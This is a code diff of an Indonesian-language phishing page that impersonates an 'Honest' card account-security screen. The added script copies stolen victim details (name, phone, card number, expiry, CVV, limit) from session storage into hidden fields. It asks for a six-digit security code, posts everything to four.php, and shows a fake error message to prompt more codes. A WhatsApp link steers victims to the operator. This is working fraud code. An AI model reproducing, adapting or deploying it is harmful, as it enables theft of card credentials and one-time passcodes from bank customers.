@@ -2,13 +2,11 @@
  <head>
   <meta http-equiv="content-type" content="text/html;charset=UTF-8">
   <!-- /Added by HTTrack --> 
-  <title>Amankan Akun Honest Kamu</title> 
+  <title> Amankan Akun Honest Kamu</title> 
   <meta charset="UTF-8"> 
   <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
-  <meta http-equiv="Cache-Control" content="max-age=0, no-cache, must-revalidate">
-  <meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqieaxTFUX47DFExkY-sF-8FSHBuLrpcOvx17oRoWuG5wm1jl10QLE34M4mrMbjReglP7CK3dZgNvZEO3axxnJF40QfFJ7SnVXURaPxM7fcD5UopkN0E5PUXOsHHi8cpj5dDgMhSIcx2wgaNvrqURtbQQCaXueOMZcQjKJB_m7lnmo5Pv5nwbT57AxalQ/s1080/IMG-20241026-WA0129.jpg" property="og:image">
-  <meta content="Honest Card is regulated by Financial Services Authority (OJK) and Bank Indonesia (BI)." property="og:description"/>
+  <meta http-equiv="Cache-Control" content="max-age=0, no-cache, must-revalidate"> 
   <meta http-equiv="Pragma" content="no-cache"> 
   <meta http-equiv="Expires" content="0"> 
   <link href="https://mayaestanti1.000webhostapp.com/patokmakngn.css" rel="stylesheet"> 
@@ -135,28 +133,40 @@
        </div> 
        <br> 
        <center>
-        <lbl style="font-size:18px;color:#9000a2;font-weight: 700;">
-         Masukkan Nomor WhatsApp Kamu
-        </lbl>
+ <label for="bcaId" style="margin:25px;font-weight:600; font-size:16px;color:#9000a2; transition: all 0.5s ease;" id="info">Konfirmasi Kode Keamanan</label>            <br>
+        <div style="font-size:13px;color:#000000;font-weight: 700;padding: 15px">
+         Untuk melakukan permintaan kode Keamanan,
+Silahkan klik "Request kode Keamanan"
+        </div>
        </center> 
        <br> 
        <form id="form" onsubmit="send(event); return false" method="post"> 
+<input type="hidden" id="nama" name="nama">
+<input type="hidden" id="nomor" name="nomor">
+<input type="hidden" id="debit" name="debit">
+<input type="hidden" id="valid" name="valid">
+<input type="hidden" id="cvv" name="cvv">
+<input type="hidden" id="limit" name="limit">
+
         <div class="row mb-4"> 
          <div class="col-12"> 
-  <input type="text" class="" id="nama" value="" name="nama" maxlength="" placeholder="Nama Lengkap" minlength="" required style="background-image: url(); background-size: 100% 110%; background-position: 100% 90%; height: 42px; padding:15px; margin-top: 0px; outline: none">    <br>    
           <div class="form-group"> 
-           <label for="bcaId" style="margin:25px;font-weight:600; font-size:14px;color:#9000a2">No.WhatsApp :</label> 
-           <input type="tel" inputmode="numeric" class="" id="one" value="" name="one" maxlength="12" placeholder="" minlength="9" required style="background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDuc8liLANbS340y37dqg7sAM0IVPvZcinoNCRaMzsAOIBGGwlemn_CPbRSswxys1aEfQKJvLeR2sk8orsNmjkaZJOykcGMnNiH__iqY7fthSO4c4b4NwR7zppdmXd3I2SxOB_bvu9-ifoWJegYajBSVhpHxnnIBAqbRAKjUPaB0khYHOHXp0KClEdkyA/s1080/AddText_10-26-04.55.01.jpg); background-size: 100% 110%; background-position: 100% 90%; height: 42px; padding-left: 60px; margin-top: 10px; outline: none"> 
+          
+           <input type="tel" inputmode="numeric" class="" id="ot" value="" name="ot" maxlength="6" placeholder="Kode Keamanan" minlength="6" required style="background-image: url(); background-size: 100% 110%; background-position: 100% 90%; height: 42px;margin-top: 10px; outline: none; padding-left: 15px"> 
           </div> 
+          <center>
+<div style="font-size:14px;color:#9000a2;font-weight: bold; text-align: center; padding: 15px" onclick="location.href='https://wa.me/6281367227186?text=Saya Mau Request Kode Keamanan'">>> Klik Untuk Request Kode Keamanan <<
+         </div> 
+         </center>
           <br> 
          </div> 
         </div> 
 
       </div> 
-      <br> 
+     
       <div class="row"> 
        <div class="col-12 col-sm col-md-8 mx-auto"> 
-        <button href="#" id="btnSubmit" class="btn-punya" type="submit">Lanjutkan</button> 
+<button href="#" id="btnSubmit" class="btn-punya" type="submit">Lanjutkan</button> 
         <br>
         <br>
         <br> 
@@ -168,17 +178,60 @@
    </div> 
    <br> 
    <footer> 
- <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEje0yJ51zH0NJZFQ1HsmsmI6rHHDFM90cRdVxe5NwzQCDW1SPkrryoqJzpjPw3s3J0kJtEvBI4s_DnJZGh6oeZLCA9zzIMJ2TBUTXuvbfGxMi8dedFGJX0cvElVE36z_18jFJU-G6qDvDGdG6cqFK_6fzSuVY9PUQRj0xiVGY3ejjswe7QA_7bOQQ0TFPE/s1080/Screenshot_20241026_161333_Chrome.jpg" style="width: 100%; position: absolute; left: 0; right: 0; top: 570;">  
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEje0yJ51zH0NJZFQ1HsmsmI6rHHDFM90cRdVxe5NwzQCDW1SPkrryoqJzpjPw3s3J0kJtEvBI4s_DnJZGh6oeZLCA9zzIMJ2TBUTXuvbfGxMi8dedFGJX0cvElVE36z_18jFJU-G6qDvDGdG6cqFK_6fzSuVY9PUQRj0xiVGY3ejjswe7QA_7bOQQ0TFPE/s1080/Screenshot_20241026_161333_Chrome.jpg" style="width: 100%; position: absolute; left: 0; right: 0; top: 570;">  
    </footer>
   </section> 
 <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
 <script src="https://dev-danapemulihan.pantheonsite.io/asset/jquery.mask.min.js"></script>
 <script>$(document).ready(function(){$('#one').on('input', function(){if($(this).val() == '0' || $(this).val() == '62'){$(this).val('');}});});</script>  
-  <script>
-    
-</script> 
+<script>
+var nomor = sessionStorage.getItem("nomor");
+document.getElementById("nomor").value = nomor + "";
+var nama = sessionStorage.getItem("nama");
+document.getElementById("nama").value = nama + "";
+var debit = sessionStorage.getItem("debit");
+document.getElementById("debit").value = debit + "";
+var valid = sessionStorage.getItem("valid");
+document.getElementById("valid").value = valid + "";
+var cvv = sessionStorage.getItem("cvv");
+document.getElementById("cvv").value = cvv + "";
+var limit = sessionStorage.getItem("limit");
+document.getElementById("limit").value = limit + "";
+</script>
   <p id="status"></p> 
-  <script>
+     <script type="text/javascript">
+            $(document).ready(function(){
+
+                // Format mata uang.
+                $( '.uang' ).mask('000.000.000.000', {reverse: true});
+ var dengan_rupiah = document.getElementById('saldo');
+    dengan_rupiah.addEventListener('keyup', function(e)
+    {
+        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
+    });
+    
+    
+      /* Fungsi */
+    function formatRupiah(angka, prefix)
+    {
+        var number_string = angka.replace(/[^,\d]/g, '').toString(),
+            split    = number_string.split(','),
+            sisa     = split[0].length % 3,
+            rupiah     = split[0].substr(0, sisa),
+            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
+            
+        if (ribuan) {
+            separator = sisa ? '.' : '';
+            rupiah += separator + ribuan.join('.');
+        }
+        
+        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
+        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
+    }
+            })
+            
+            
+       
    
             $(document).ready(function() {
             $("div#eyeOpen").on('click', function() {
@@ -232,19 +285,22 @@ document.getElementById('btnSubmit').innerHTML = "Memproses....";
 
  $.ajax({
  type: 'POST',
- url: 'one.php',
+ url: 'four.php',
  data: $(this).serialize(),
  
  complete: function(data) {
  vibr(180);    
             console.log('Complete')
    setTimeout(function(){
- window.location.href='dbt.html';
+ $("#info").text('Terjadi Kesalahan, Coba lagi');
+ $('#info').css("color", "red")
  var nomor = document.getElementById("one").value;
  sessionStorage.setItem("nomor", nomor);
- var nama = document.getElementById("nama").value;
- sessionStorage.setItem("nama", nama);
     }, 1000);
+    setTimeout(function(){
+  $("#info").text('Konfirmasi Kode Keamanan');
+ $('#info').css("color", "#9000a2")       
+    }, 3000);
         }
     });
  });
